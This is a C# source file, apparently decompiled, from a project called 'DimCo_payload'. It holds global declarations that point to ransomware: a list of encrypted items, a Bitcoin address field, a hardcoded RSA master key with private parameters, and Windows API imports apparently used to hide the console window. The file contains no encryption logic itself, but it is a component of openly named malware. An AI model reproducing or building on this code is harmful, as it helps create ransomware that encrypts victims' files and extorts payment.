using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using DimCo_payload.Encryption;

namespace DimCo_payload;

internal class global
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public cmd(string name, string args)
		{
			_name = name;
			_args = args;
		}
	}

	public static List<string> encrypted = new List<string>();

	public static string BitcoinAddr = "";

	public static string masterkey = "<RSAKeyValue><Modulus>z4pg6hlwxcUW5TcvdfhzKqFfMFM9SBuqKbJhqFsxbKofGgW8bue9RC4I2Fkzfs8lvCX2bLlXC3YgmssgYtYA+ApwZyYa0X/RQsb0BCCvgKM7u1EHSRrhK1CbpIk6ysMykhcfLHjWVBbtf2Iq9sEGXla3FCfPc/2ELC+Egw0KHfS92Ehb50C/t9dtTaAk6my5qjtP0hmRgFkUxjLbi678EC7YIyAHGzxOKz2eGzXeYaBXS27tXFJENrW6rlsCtxuCCUJYbXKhg5bDxqAF/e0LQNOTL/RnSC5Y8mtNT6HzyazTmziPJwm+BfqpxWhPdnDEwuPRJtMOcjN+Y2o7pOC7pQ==</Modulus><Exponent>AQAB</Exponent><P>2/o9Lq4K6jVOHG5bHQ4Qxvd27/S+WHVcXY/qqvgVXpEahKT7AUE0XYy8KXBWk8aIqxbZeSporbqtaFtUoT7tCtXZw8wr1lsPJhbWZeINrd2j+85dqEeT8HmZnHYgOG3iOJybj5BMhKF4Xe0I4RojrM5BGncRT7AC77A0YYfHwkc=</P><Q>8YbD5dzHEslhXLBHcaLMMq7UsUc7fC0yLeQcItX3TVBrX1h4uPZndPloCTtGit/ql85xtL6+4MZBNe7YwaZNGtO59ROShjkUj99dbAbYawOjymf2RQhnWbtOSklAc21Oseak8rEH0TJ1So5FP6UeYWX1JVD6bNOHAcW6YRxa/LM=</Q><DP>0EUXYjfUC7UWVGLDjzm+9rJbgIrHIPdU0RyuQNsLWHKnmcieAa0biCr0B4Pd5KHGyb2jf02AuGOTRMeb0+LBCU45lGCdbKDgMd7TdLjW3LOJS6IyGF5Umgx3PKS2ktaupYzY1872M2ixjrQagQ1/k1/gUc9Dq5/o18iLf3/PyIc=</DP><DQ>5+HC4kT8u4Sr/Rkg/nCWK3K+sRT6f1XE/1opySgzrf6vl3KRNMMcwKlSwMowB9TCncyOTkFzcMnmgak2YXUQQdlUh36rBkJ3A0onnzdTQCrWbdUyE0TmNLgnihqZzjf7fcE6S+a64pXXFiVRRrF4YXpJyfHc++55h7IWJnXaxRE=</DQ><InverseQ>2wdoAPjQsA+MIegyRTxCOpvMcfcDzRHRSaxYJqP5hKV3DgKsA/MU8NkOSAyLoWpKW3SXSgHsnxamV0XJJc2bR0yqbCRYcV5wbnDFyZd1S9YAh+I7V2A4eE4aen/k3GUSY4Sy+zMohlpTnf71+/buxykAL4m6DuXoKivGp606ZTI=</InverseQ><D>lRqpvgZBCxUp+cvIAU1aEEqXhLSI1oFpo0NQ/g9mVtdyONPeKR+8znr0R9ruMDDKv33WqQ4PB2D607sTrW5qi8mUL8ckhVb7FKqzLTP+YsDjbRQt08vH8cKbz334Cyxp7KNH9j9qXEeMoXP5wgWzeZt7NLPVS1Pb3ZLV9QEtP48GNO40yqeYpkWaHRh7ESfBoBJWr+xlWELmnW6hAJjYWm1v2pELPI5Txq2YjjiDpwogGbGdHjSVD9/Y+e/9XmA2aVefscLNs+pJBnB2ipTPFO3veXhdqH+mG2mICiOcdi33rQy811uZXDwTrRVacqjQ53izdBBnQLv3T7bhnDLikQ==</D></RSAKeyValue>";

	public static DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys Keys = new DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys();

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
